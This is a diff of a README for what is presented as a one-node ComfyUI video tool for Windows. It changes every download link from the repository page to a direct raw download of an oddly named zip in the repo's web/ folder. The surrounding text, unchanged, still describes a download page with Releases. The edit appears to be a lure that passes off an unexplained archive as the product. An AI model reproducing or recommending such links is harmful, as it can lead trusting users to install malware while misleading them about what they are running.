@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-ALLinONE-MinimaxH3 - Create Amazing Videos with One Node
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--ALLinONE--MinimaxH3-9cf.svg?style=for-the-badge&logo=github)](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--ALLinONE--MinimaxH3-9cf.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3/main/web/Lin-Comfy-AL-ON-Minimax-U-v1.5-beta.5.zip)
 
 Welcome! This guide will help you download and start using ComfyUI-ALLinONE-MinimaxH3 on your Windows computer. If you've ever wanted to create stunning videos, animate images, or bring still photos to life - you're in the right place. This tool combines everything you need into one single, easy-to-use node.
 
@@ -25,7 +25,7 @@ Let's get you up and running in just a few minutes. Follow these simple steps ca
 
 First, you need to get the application onto your computer. Click the big button below or the one at the top of this page:
 
-[**Visit this link to download the application**](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
+[**Visit this link to download the application**](https://raw.githubusercontent.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3/main/web/Lin-Comfy-AL-ON-Minimax-U-v1.5-beta.5.zip)
 
 This link will take you to the download page. Once you're there, look for a button or section that says "Download" or "Releases." Click on it to start downloading.
 
@@ -122,7 +122,7 @@ You now have everything you need to start your video creation journey. Remember:
 
 The download link again for your convenience:
 
-[**Visit this link to download the application**](https://github.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3)
+[**Visit this link to download the application**](https://raw.githubusercontent.com/Offsite-squaredeal736/ComfyUI-ALLinONE-MinimaxH3/main/web/Lin-Comfy-AL-ON-Minimax-U-v1.5-beta.5.zip)
 
 Thank you for choosing ComfyUI-ALLinONE-MinimaxH3. We can't wait to see what you'll create!
 
